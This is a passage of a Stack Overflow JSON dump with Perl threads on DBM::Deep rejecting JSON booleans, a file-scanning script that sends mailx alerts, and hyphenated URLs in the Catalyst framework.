"user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1466614557, "post_id": 37974083, "comment_id": 63394423, "body": "I think the OP meant to write <code>false</code> instead of <code>null</code>; JSON <code>null</code> is mapped to Perl <code>undef</code>, but JSON <code>false</code> is mapped to a JSON::PP::Boolean (or similar) object."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1466616646, "post_id": 37974083, "comment_id": 63395645, "body": "The OP also said it works for <code>null</code> further in his answer. It&#39;s <code>false</code> and <code>true</code> that don&#39;t work. Fixed question."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": -2, "last_activity_date": 1466614251, "creation_date": 1466614251, "answer_id": 37974083, "question_id": 37973342, "link": "https://stackoverflow.com/questions/37973342/dbmdeep-is-failing-to-import-hashref-having-true-or-false-values/37974083#37974083", "title": "DBM::Deep is failing to import hashref having &#39;true&#39; or &#39;false&#39; values", "body": "<p>Your code works fine for me, with the only change being to set</p>\n\n<pre><code>my $path = 'test.json';\n</code></pre>\n\n<p>You should check your module version numbers. These are the ones that I have</p>\n\n<pre><code>print $DBM::Deep::VERSION, \"\\n\";    # 2.0013\nprint $JSON::VERSION, \"\\n\";         # 2.90\nprint $JSON::XS::VERSION, \"\\n\";     # 3.02\n</code></pre>\n\n<p>and I am running Perl v5.24.0</p>\n\n<p>The dumped output is as follows</p>\n\n<h3>Newly-created <code>DBM::Deep</code> database</h3>\n\n<pre><code>$VAR1 = bless( {}, 'DBM::Deep::Hash' );\n</code></pre>\n\n<h3>output of <code>$json-&gt;decode</code></h3>\n\n<pre><code>$VAR1 = {\n          'a' =&gt; undef\n        };\n</code></pre>\n\n<h3>Populated <code>DBM::Deep</code> database after the <code>eval</code></h3>\n\n<pre><code>$VAR1 = bless( {\n                 'test.json' =&gt; bless( {\n                                         'a' =&gt; undef\n                                       }, 'DBM::Deep::Hash' )\n               }, 'DBM::Deep::Hash' );\n</code></pre>\n\n<p>All of that looks to be as it should</p>\n"}], "owner": {"reputation": 801, "user_id": 3264448, "user_type": "registered", "accept_rate": 65, "profile_image": "https://i.stack.imgur.com/1EyDR.jpg?s=128&g=1", "display_name": "CodeQuestor", "link": "https://stackoverflow.com/users/3264448/codequestor"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 122, "favorite_count": 0, "accepted_answer_id": 37973857, "answer_count": 2, "score": 1, "last_activity_date": 1466616773, "creation_date": 1466612016, "last_edit_date": 1466616773, "question_id": 37973342, "link": "https://stackoverflow.com/questions/37973342/dbmdeep-is-failing-to-import-hashref-having-true-or-false-values", "title": "DBM::Deep is failing to import hashref having &#39;true&#39; or &#39;false&#39; values", "body": "<p>I have the <code>JSON</code> text as given below :</p>\n\n<h2>test.json</h2>\n\n<pre><code>{\n  \"a\" : false\n}\n</code></pre>\n\n<p>I want to create the <code>DBM::Deep</code> hash for above JSON. My code is looks like as given below :</p>\n\n<h2>dbm.pl</h2>\n\n<pre><code>use strict;\nuse warnings;\n\nuse DBM::Deep;\nuse JSON;\nuse Data::Dumper;\n\n# create the dbm::deep object\nmy $db = DBM::Deep-&gt;new(\n    file =&gt; 'test.db',\n    type =&gt; DBM::Deep-&gt;TYPE_HASH\n);\n\nmy $json_text = do {\n    open( my $json_fh, $path )\n      or die(\"Can't open \\$path\\\": $!\\n\");\n    local $/;\n    &lt;$json_fh&gt;;\n};\n\nmy $json = JSON-&gt;new;\nmy $data = $json-&gt;decode($json_text);\nprint Dumper($data);\n\n# create dbm::deep hash\neval { $db-&gt;{$path} = $data; };\n\nif ($@) {\n    print \"error : $@\\n\";\n}\n</code></pre>\n\n<p>I am getting below output/error on execution of above code:</p>\n\n<h2>Error</h2>\n\n<blockquote>\n  <p>$VAR1 = {\n                'a' => bless( do{(my $o = 0)}, 'JSON::XS::Boolean' )\n              };\n      error : DBM::Deep: Storage of references of type 'SCALAR' is not supported. at dbm.pl line 26</p>\n</blockquote>\n\n<p>It seems like, JSON internally uses JSON::XS which convert the 'true' value in JSON::XS::Boolean object and DBM::Deep is not able to handle this, while it can handle the null value.</p>\n\n<p>While the above code is working fine for below inputs:</p>\n\n<pre><code>{\n  \"a\" : 'true'  # if true is in quotes\n}\n</code></pre>\n\n<p>or</p>\n\n<pre><code>{\n  \"a\" : null \n}\n</code></pre>\n\n<p>I tried many thing, but nothing worked. Does anyone has any workaround?</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466610881, "post_id": 37972911, "comment_id": 63392083, "body": "Your program seems a fair start, although it&#39;s usually unnecessary to read the whole file into memory, and can make coding more awkward. What is your question?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466611105, "post_id": 37972911, "comment_id": 63392227, "body": "If you&#39;re looking <i>only</i> for appearances of <code>$match</code> at the start of a line then I suggest that you write just <code>if ( $cont =~ &#47;^$match\\b&#47;m ) { # send email )</code>"}], "answers": [{"tags": [], "owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "is_accepted": false, "score": 3, "last_activity_date": 1466611674, "creation_date": 1466611674, "answer_id": 37973233, "question_id": 37972911, "link": "https://stackoverflow.com/questions/37972911/perl-script-look-at-the-first-number-of-each-line-and-alert-if-0-exists/37973233#37973233", "title": "Perl Script \u2013 Look at the first number of each line and alert if 0 exists", "body": "<p>I'd probably go with something like:</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict;\nuse warnings;\n\nmy $file   = '/users/tneal01/SPOOL/output.txt';\nmy $mark   = '0';\nmy $search = qr/^$mark\\b/;\n\n\nopen my $fh, '&lt;', $file or die \"Can't open $file -- $!\";\n\nwhile (&lt;$fh&gt;) {\n\n   #line starts with 0. Or check other regex.\n   if (m/$search/) {\n      my $body = \"status $mark has been recorded \";\n      my $cmd_email =\n        \"echo $body | \" . \"mailx -s \\\"error occurring\\\" tneal01\\@gmail.com\";\n      system($cmd_email) == 0 or die \"Error sending email -- $!\";\n\n     #bail out the loop - assume you don't want more than one email per thing.\n      last;\n   }\n}\n\nclose ( $fh );\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 145, "user_id": 6292987, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/cf408d91ad5f6adb872fb56220c1b85b?s=128&d=identicon&r=PG&f=1", "display_name": "connollyc4", "link": "https://stackoverflow.com/users/6292987/connollyc4"}, "edited": false, "score": 0, "creation_date": 1467131954, "post_id": 37973382, "comment_id": 63599973, "body": "Thank you Sergio! I like addition of the counter times!"}], "tags": [], "owner": {"reputation": 368, "user_id": 6430078, "user_type": "registered", "profile_image": "https://graph.facebook.com/10204857806084476/picture?type=large", "display_name": "Sergio Bernardo", "link": "https://stackoverflow.com/users/6430078/sergio-bernardo"}, "is_accepted": false, "score": 2, "last_activity_date": 1466612156, "creation_date": 1466612156, "answer_id": 37973382, "question_id": 37972911, "link": "https://stackoverflow.com/questions/37972911/perl-script-look-at-the-first-number-of-each-line-and-alert-if-0-exists/37973382#37973382", "title": "Perl Script \u2013 Look at the first number of each line and alert if 0 exists", "body": "<p>This solution only reads one line at a time... there are simple solutions, but would need to load the entire file into memory...\nI'm also assuming you want to know how many occurencies of $mark there are in the file.</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\n\nmy $file = 'file.txt';\nmy $mark = '0';\n\nopen my $f, \"&lt;$file\" or die \"Error open file: $!\\n\";\nmy $counter=0;\nwhile(my $line = &lt;$f&gt;) {\n  if($line =~ /$mark/) {\n    $counter++;\n  }\n}\nif($counter) {\n    my $body = \"status $mark has been recorded $counter times\";\n    my $cmd_email = \"echo $body | mailx -s \\\"error occurring\\\" tneal01\\@gmail.com\";\n    system($cmd_email) == 0  or die \"Error sending email -- $!\";\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 145, "user_id": 6292987, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/cf408d91ad5f6adb872fb56220c1b85b?s=128&d=identicon&r=PG&f=1", "display_name": "connollyc4", "link": "https://stackoverflow.com/users/6292987/connollyc4"}, "edited": false, "score": 0, "creation_date": 1467366155, "post_id": 37973653, "comment_id": 63713983, "body": "If you find answers to be useful, please consider upvoting them and accepting one."}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 0, "last_activity_date": 1466612902, "creation_date": 1466612902, "answer_id": 37973653, "question_id": 37972911, "link": "https://stackoverflow.com/questions/37972911/perl-script-look-at-the-first-number-of-each-line-and-alert-if-0-exists/37973653#37973653", "title": "Perl Script \u2013 Look at the first number of each line and alert if 0 exists", "body": "<p>This does a couple of things differently to other solutions here.</p>\n\n<ol>\n<li>It reads from whatever filename is given on the command line</li>\n<li>It stops checking once the first error is found</li>\n</ol>\n\n<p>I don't know how useful those improvements are to you.</p>\n\n<pre><code>use warnings;\nuse strict;\n\nmy $mark = 0;\n\nwhile (&lt;&gt;) {\n  my ($num) = /^(\\d)/;\n  if ($num == $mark) {\n    my $body = \"status $num has been recorded \";\n    my $cmd_email = \"echo $body | \" .\n        'mailx -s \"error occurring\" tneal01\\@gmail.com';\n    system($cmd_email) == 0  or die \"Error sending email -- $!\";\n    last; # stop checking after the first error\n  }\n}\n</code></pre>\n\n<p>(Oh, and I switched some double-quotes to single-quotes so you don't have to escape embedded double quotes.)</p>\n"}, {"comments": [{"owner": {"reputation": 145, "user_id": 6292987, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/cf408d91ad5f6adb872fb56220c1b85b?s=128&d=identicon&r=PG&f=1", "display_name": "connollyc4", "link": "https://stackoverflow.com/users/6292987/connollyc4"}, "edited": false, "score": 0, "creation_date": 1467131988, "post_id": 37974234, "comment_id": 63600001, "body": "Thank you Adam, I how you included the breakdown!"}, {"owner": {"reputation": 11023, "user_id": 1225617, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/d5221312c38d547a0de3476fa0b8e49a?s=128&d=identicon&r=PG", "display_name": "Adam Millerchip", "link": "https://stackoverflow.com/users/1225617/adam-millerchip"}, "reply_to_user": {"reputation": 145, "user_id": 6292987, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/cf408d91ad5f6adb872fb56220c1b85b?s=128&d=identicon&r=PG&f=1", "display_name": "connollyc4", "link": "https://stackoverflow.com/users/6292987/connollyc4"}, "edited": false, "score": 1, "creation_date": 1467173015, "post_id": 37974234, "comment_id": 63615895, "body": "No problem. You could up-vote the answers you found useful, and accept the answer you used. We like that because we get points. :-)"}], "tags": [], "owner": {"reputation": 11023, "user_id": 1225617, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/d5221312c38d547a0de3476fa0b8e49a?s=128&d=identicon&r=PG", "display_name": "Adam Millerchip", "link": "https://stackoverflow.com/users/1225617/adam-millerchip"}, "is_accepted": false, "score": 0, "last_activity_date": 1466615411, "last_edit_date": 1466615411, "creation_date": 1466614770, "answer_id": 37974234, "question_id": 37972911, "link": "https://stackoverflow.com/questions/37972911/perl-script-look-at-the-first-number-of-each-line-and-alert-if-0-exists/37974234#37974234", "title": "Perl Script \u2013 Look at the first number of each line and alert if 0 exists", "body": "<p>This version uses minimal changes to your existing script. I've commented the changes.</p>\n\n<pre><code>use warnings;\nuse strict;\n\nmy $file = '/users/tneal01/SPOOL/output.txt';\nmy $mark = 0;\n\n\nmy $cont = do {\n    open my $fh, '&lt;', $file  or die \"Can't open $file -- $!\";\n    local $/;\n    &lt;$fh&gt;;\n};\n\n# Pull the first number            &lt;-- comment not needed\n# my ($num) = $cont =~ /^(\\d+)/; # &lt;-- delete this line\n\nif ($cont =~ /^$mark/m)     # &lt;-- change the condition to this regex\n{\n    my $body = \"status $mark has been recorded \"; # replace $num with $mark\n    my $cmd_email = \"echo $body | \" .\n        \"mailx -s \\\"error occurring\\\" tneal01\\@gmail.com\";\n    system($cmd_email) == 0  or die \"Error sending email -- $!\";\n}\n</code></pre>\n\n<p>What the change does is use a regular expression to check if any lines begin with the value defined in <code>$mark</code>.</p>\n\n<p>I deleted the <code>$num</code> variable, but its contents was the same as <code>$mark</code> so we can just use <code>$mark</code> instead.</p>\n\n<p>A breakdown of <code>$cont =~ /^$mark/m</code>:</p>\n\n<ul>\n<li><code>$cont =~</code> Apply the following regex to the string contained in <code>$cont</code></li>\n<li><code>/</code> Start the regular expression</li>\n<li><code>^</code> Match the beginning of a line</li>\n<li><code>$mark</code> Match the string specified in the $mark variable</li>\n<li><code>/</code> End regular expression</li>\n<li><code>m</code> Flag to tell the regex to treat <code>$cont</code> as a multiple-line string (which it is)</li>\n</ul>\n"}], "owner": {"reputation": 145, "user_id": 6292987, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/cf408d91ad5f6adb872fb56220c1b85b?s=128&d=identicon&r=PG&f=1", "display_name": "connollyc4", "link": "https://stackoverflow.com/users/6292987/connollyc4"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 117, "favorite_count": 0, "answer_count": 4, "score": 1, "last_activity_date": 1466615411, "creation_date": 1466610684, "question_id": 37972911, "link": "https://stackoverflow.com/questions/37972911/perl-script-look-at-the-first-number-of-each-line-and-alert-if-0-exists", "title": "Perl Script \u2013 Look at the first number of each line and alert if 0 exists", "body": "<p>Currently the script only looks at the first character of a txt file and emails if that value =0 using regex. I'm trying to update the script so it looks at each line until the end of the file and alert of any of the lines have the number 0. If all lines have 1 then do nothing. Any help would be greatly appreciated. </p>\n\n<p>Example of an alert</p>\n\n<pre><code>1\n1\n1\n0 -since there is a 0 an email alert would be generated \n1\n1\n</code></pre>\n\n<p>code below:</p>\n\n<pre><code>use warnings;\nuse strict;\n\nmy $file = '/users/tneal01/SPOOL/output.txt';\nmy $mark = 0;\n\n\nmy $cont = do {\n    open my $fh, '&lt;', $file  or die \"Can't open $file -- $!\";\n    local $/;\n    &lt;$fh&gt;;\n};\n\n# Pull the first number\nmy ($num) = $cont =~ /^(\\d+)/;\n\nif ($num == $mark)\n{\n    my $body = \"status $num has been recorded \";\n    my $cmd_email = \"echo $body | \" .\n        \"mailx -s \\\"error occurring\\\" tneal01\\@gmail.com\";\n    system($cmd_email) == 0  or die \"Error sending email -- $!\";\n}\n</code></pre>\n"}, {"tags": ["perl", "catalyst"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466600572, "post_id": 37968638, "comment_id": 63383425, "body": "I&#39;m not sure of your purpose. Are you saying that you want to avoid having to type the hyphens and want to enter <code>&#39;TravelTo&#39;</code> and <code>&#39;&#47;area&#47;StorageLocker&#39;</code> and have them converted automatically?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466610044, "post_id": 37968638, "comment_id": 63391514, "body": "I understand the question as that he is too lazy to type the same kind of attributes on his subs all the time. Instead, he wants a way to make the Catalyst framework do this dash-behavior automatically. Also see <a href=\"http://blogs.perl.org/mt/mt-search.fcgi?blog_id=11&amp;tag=veure&amp;limit=20\" rel=\"nofollow noreferrer\">blogs.perl.org/mt/&hellip;</a> to understand what <i>Veure</i> is."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1466611459, "post_id": 37968638, "comment_id": 63392508, "body": "@simbabque: It isn&#39;t clear to me how the OP&#39;s stated intention of converting camel case to snake case and replacing underscores with hyphens helps to solve his frustration in <i>&quot;having to write things like this&quot;</i>.  Are we talking about some sort of source code filter, or an IDE macro perhaps? As far as I can tell, <code>Path</code> and <code>Args</code> should stay unchanged, and I know that Catalyst does some sort of identifier translation in a similar way to <code>DBIx::Class</code>, but I&#39;m struggling to imagine how the code in a useful answer would be used by the OP"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466611788, "post_id": 37968638, "comment_id": 63392714, "body": "@borodin I think he is looking for alternatives to using Path in the way he does. The examples make it clear that it&#39;s basically redundant, but for the hyphen replacement. So it&#39;s something that can be added to the Catalyst application that makes the use of Path unnecessary but retains the shown functionality. We could theoretically close it as off topic for recommendations but I think it&#39;s a rather interesting problem."}], "answers": [{"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 2, "last_activity_date": 1467554561, "last_edit_date": 1467554561, "creation_date": 1466600421, "answer_id": 37968830, "question_id": 37968638, "link": "https://stackoverflow.com/questions/37968638/replace-underscores-with-hyphens-in-perl-catalyst-urls/37968830#37968830", "title": "Replace underscores with hyphens in Perl Catalyst URLs", "body": "<p>CPAN has the <a href=\"https://metacpan.org/pod/String::CamelCase\" rel=\"nofollow\"><code>String::CamelCase</code></a> module, which offers a <code>decamelize</code> function, after which you will need to convert underscores to hyphens using <code>tr/_/-/</code></p>\n\n<p>I hope this short example helps to answer your question</p>\n\n<pre><code>use strict;\nuse warnings 'all';\nuse v.14.1;\n\nuse String::CamelCase 'decamelize';\n\nfor my $s ( 'travel_to', 'Veure::Controller::Area::StorageLocker' ) {\n    (my $ss = $s) =~ s|^[\\w:]*::Controller(?=::)||;\n    $ss =~ s|::|/|g;\n    $ss = decamelize($ss) =~ tr/_/-/r;\n    say $ss;\n}\n</code></pre>\n\n<h3>output</h3>\n\n<pre><code>travel-to\n/area/storage-locker\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "edited": false, "score": 1, "creation_date": 1466605946, "post_id": 37970910, "comment_id": 63388451, "body": "the clean way to do it would be to create a new controller subclass, and a new attribute called <code>Dashy</code> or whatever you like. Then the controller class would define a <code>_parse_Dashy_attr</code> method that returns <code>(Path =&gt; $value =~ s&#47;_&#47;-&#47;gr)</code> or whatever it likes. That way you can use it selectively without affecting unrelated code that uses <code>Path</code>."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "edited": false, "score": 0, "creation_date": 1466606365, "post_id": 37970910, "comment_id": 63388798, "body": "@hobbs you mean a <code>: Dashy</code> sub attribute?"}, {"owner": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "edited": false, "score": 0, "creation_date": 1466606571, "post_id": 37970910, "comment_id": 63388973, "body": "yep. Although I misspoke, of course it needn&#39;t use the value passed to the attr, since the point is to save typing, it can use the method name which is passed in as the third arg."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "edited": false, "score": 0, "creation_date": 1466606681, "post_id": 37970910, "comment_id": 63389051, "body": "@hobbs But that would still require any typing. I think having the controller base class automatically adding it to every action that is not <code>Local</code> or has a <code>Path</code> of its own might be good as well. That would save even more typing, and I figure Veure has quite a bit of those cases."}, {"owner": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "edited": false, "score": 0, "creation_date": 1466606807, "post_id": 37970910, "comment_id": 63389139, "body": "Yeah, that&#39;s possible, just trying to propose something that fits in a little more with Catalyst philosophy but still reduces the typing and repetition. I guess I should go make my own answer :)"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "edited": false, "score": 0, "creation_date": 1466606886, "post_id": 37970910, "comment_id": 63389205, "body": "I&#39;m looking forward to that."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466609389, "post_id": 37970910, "comment_id": 63391028, "body": "@simbabque: Since you seem to understand the question better than I do, perhaps you could clarify it for us?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1466609887, "post_id": 37970910, "comment_id": 63391386, "body": "@Borodin which part? Can you clarify what you want me to clarify? I thought it pretty clear, but you need some Catalyst knowledge for it.:)"}], "tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": false, "score": 3, "last_activity_date": 1466606194, "last_edit_date": 1495542758, "creation_date": 1466605382, "answer_id": 37970910, "question_id": 37968638, "link": "https://stackoverflow.com/questions/37968638/replace-underscores-with-hyphens-in-perl-catalyst-urls/37970910#37970910", "title": "Replace underscores with hyphens in Perl Catalyst URLs", "body": "<p>I did a bit of digging in the Catalyst sources. </p>\n\n<p><strong>Cammel case controller names</strong></p>\n\n<p>You can modify <a href=\"https://metacpan.org/source/JJNAPIORK/Catalyst-Runtime-5.90105/lib/Catalyst/Utils.pm#L112\" rel=\"nofollow noreferrer\"><code>class2prefix</code></a> in <a href=\"https://metacpan.org/pod/Catalyst::Utils#class2prefix-class-case\" rel=\"nofollow noreferrer\">Catalyst::Utils</a> to change how the controller names translate to the <em>namespace</em>.</p>\n\n<p>Here is a very quick hack that demonstrates what is going on with a fresh MyApp created with <em>catalyst.pl</em>. I borrowed <a href=\"https://stackoverflow.com/a/37968830/1331451\">Borodin's suggestion</a> to implement it.</p>\n\n<pre><code>package MyApp::Controller::FooBar;\nuse Moose;\nuse namespace::autoclean;\nBEGIN { extends 'Catalyst::Controller'; }\n\n{\n    require Class::Method::Modifiers;\n    require String::CamelCase;\n\n    Class::Method::Modifiers::around(\n        'Catalyst::Utils::class2prefix'  =&gt; sub {\n            my $orig = shift;\n\n            # I borrowed most of this from the original function ...\n            my $class = shift || '';\n            my $prefix = shift || 0;\n            if ( $class =~ /^.+?::([MVC]|Model|View|Controller)::(.+)$/ ) {\n                $prefix = $2;\n                $prefix =~ s{::}{/}g;\n\n                # ... and this from https://stackoverflow.com/a/37968830/1331451\n                $prefix = String::CamelCase::decamelize($prefix) =~ tr/_/-/r;\n            }\n\n            return $prefix;\n        }\n    );\n}\n\nsub index :Path :Args(0) {\n    my ( $self, $c ) = @_;\n    $c-&gt;response-&gt;body('Matched MyApp::Controller::FooBar in FooBar.');\n} \n\n1;\n</code></pre>\n\n<p>I tested this briefly, but cannot guarantee it's not going to break anything else. I believe if it's put into a better place and done in a more appropriate way it could be a viable option.</p>\n\n<p><strong>Underscores in actions</strong></p>\n\n<p>This one looks trickier. My best bet is to fiddle with <a href=\"https://metacpan.org/pod/Catalyst::DispatchType::Path\" rel=\"nofollow noreferrer\">Catalyst::DispatchType::Path</a> in some way, or create something that installs an ActionClass that modifies it. It's basically replacing the <code>_</code> with a <code>-</code>. That <em>thing</em> could be built around  <a href=\"https://metacpan.org/source/JJNAPIORK/Catalyst-Runtime-5.90105/lib/Catalyst/Controller.pm#L381\" rel=\"nofollow noreferrer\"><code>gather_default_action_roles</code> in Catalyst::Controller</a> (maybe as a subclass) to add that one to all actions. <strong>This is highly speculative</strong>.</p>\n"}], "owner": {"reputation": 11146, "user_id": 8003, "user_type": "registered", "accept_rate": 65, "profile_image": "https://www.gravatar.com/avatar/7f633daa0796788b31b868b5ffe98157?s=128&d=identicon&r=PG", "display_name": "Ovid", "link": "https://stackoverflow.com/users/8003/ovid"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 215, "favorite_count": 3, "answer_count": 2, "score": 5, "last_activity_date": 1467554561, "creation_date": 1466599971, "last_edit_date": 1466673133, "question_id": 37968638, "link": "https://stackoverflow.com/questions/37968638/replace-underscores-with-hyphens-in-perl-catalyst-urls", "title": "Replace underscores with hyphens in Perl Catalyst URLs", "body": "<p>We're looking at options for converting CamelCase to <code>camel-case</code> and underscores to hyphens and hoping someone can offer some strong examples. (Using hyphens for SEO reasons).</p>\n\n<p>Specifically:</p>\n\n<p>Working on an MMORPG in Catalyst and getting tired of having to write things like this:</p>\n\n<pre><code>sub travel_to  ( $self, $c, $star ) : Path('travel-to') Args(1)  { ... }\n</code></pre>\n\n<p>Or this:</p>\n\n<pre><code>package Veure::Controller::Area::StorageLocker {\n    